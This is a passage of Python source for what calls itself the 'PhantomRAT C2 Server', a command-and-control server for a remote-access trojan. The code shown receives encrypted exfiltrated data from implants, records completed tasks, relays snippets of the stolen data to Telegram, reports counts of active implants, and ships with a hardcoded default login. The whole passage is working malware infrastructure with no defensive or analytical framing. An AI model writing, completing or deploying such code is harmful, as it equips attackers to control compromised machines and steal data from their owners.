    if request.headers.get('User-Agent') != PROFILE['security']['user_agent']:
        return '', 403
    
    try:
        data = decrypt_data(request.data)
        if not data:
            return '', 400
        
        implant_id = data.get('id')
        exfil_data = data.get('data')
        
        db = get_db()
        # Update task result if it's a response
        if 'task_id' in data:
            db.execute('UPDATE tasks SET status = ?, completed_at = ?, result = ? WHERE id = ?',
                      ('completed', time.time(), json.dumps(exfil_data), data['task_id']))
        
        db.commit()
        send_telegram(f"📤 Exfil from {implant_id[:8] if implant_id else 'unknown'}: {json.dumps(exfil_data)[:100]}...")
        return '', 200
    except Exception as e:
        print(f"[!] Exfil error: {e}")
        return '', 400

@app.route('/api/stats')
@login_required
def api_stats():
    db = get_db()
    active_count = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
    total_count = db.execute('SELECT COUNT(*) FROM implants').fetchone()[0]
    pending_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
    
    return jsonify({
        'active_implants': active_count,
        'total_implants': total_count,
        'pending_tasks': pending_count,
        'uptime': int(time.time() - app_start_time)
    })

# Global variable to track app start time
app_start_time = time.time()

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='PhantomRAT C2 Server v4.0')
    parser.add_argument('--host', '-i', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen on')
    parser.add_argument('--init', action='store_true', help='Initialize database')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    if args.init:
        init_db()
        print("[+] Database initialized. Starting server...")
    
    print(f"[+] PhantomRAT C2 Server v4.0")
    print(f"[+] Starting on {args.host}:{args.port}")
    print(f"[+] Dashboard: http://{args.host if args.host != '0.0.0.0' else '127.0.0.1'}:{args.port}")
    print(f"[+] Default login: admin / phantomrat")
    
    app.run(host=args.host, port=args.port, debug=args.debug)
